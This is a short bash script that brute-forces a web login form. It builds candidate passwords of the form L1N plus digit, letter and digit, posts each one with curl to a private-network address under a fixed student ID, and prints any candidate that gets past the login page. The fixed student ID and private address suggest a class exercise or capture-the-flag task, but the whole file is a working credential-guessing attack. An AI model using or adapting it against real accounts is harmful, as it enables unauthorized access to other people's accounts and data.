#!/bin/bash
for b in {0..9}; do	
	for c in A, B, C, E, G, H, J, K, L, M, N, P, R, S, T, V, W, X, Y, Z; do
		for d in {0..9}; do
			p=$(echo "L1N$b$c$d" | sed 's/,//g')
			curl -s -b "StudentID=100602581" -d "username=100602581&password=$p&login=Login" 'http://172.17.1.93/' | grep -qi "Login" || echo "$p is the password"
			#echo "$p"
		done
	done
done
